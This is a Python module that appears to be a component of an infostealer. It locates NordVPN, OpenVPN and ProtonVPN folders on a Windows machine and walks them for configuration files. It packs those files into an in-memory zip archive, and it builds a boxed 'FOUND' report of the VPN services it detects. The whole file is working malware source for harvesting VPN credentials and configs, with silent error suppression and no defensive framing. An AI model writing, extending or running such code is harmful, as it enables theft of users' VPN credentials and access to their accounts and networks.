import os
import shutil
import zipfile
import io

def get_vpn_paths():
    user_profile = os.environ['USERPROFILE']
    local_appdata = os.environ['LOCALAPPDATA']
    roaming_appdata = os.environ['APPDATA']
    
    return {
        "NordVPN": os.path.join(local_appdata, "NordVPN"),
        "OpenVPN": os.path.join(user_profile, "OpenVPN", "config"),
        "ProtonVPN": os.path.join(local_appdata, "ProtonVPN")
    }

def grab_vpn_configs():
    paths = get_vpn_paths()
    vpn_files = []
    
    for name, path in paths.items():
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if any(ext in file.lower() for ext in ['.ovpn', '.conf', '.json', '.txt', '.xml']):
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < 1 * 1024 * 1024: # 1MB limit
                                arcname = os.path.join(name, os.path.relpath(file_path, path))
                                vpn_files.append((arcname, file_path))
                        except: pass
                # Depth limit
                if root.count(os.sep) - path.count(os.sep) > 2:
                    break
                    
    if not vpn_files:
        return None
        
    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for arcname, full_path in vpn_files:
                try:
                    zipf.write(full_path, arcname=arcname)
                except: pass
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except:
        return None

def get_vpn_report():
    paths = get_vpn_paths()
    found = [name for name, path in paths.items() if os.path.exists(path)]
    if not found: return "No VPN configs found."
    
    report = "╔════════════════════════════════════════╗\n"
    report += "║              VPN SERVICES              ║\n"
    report += "╠════════════════════════════════════════╣\n"
    for vpn in found:
        report += f"║ FOUND: {vpn.ljust(31)} ║\n"
    report += "╚════════════════════════════════════════╝"
    return report
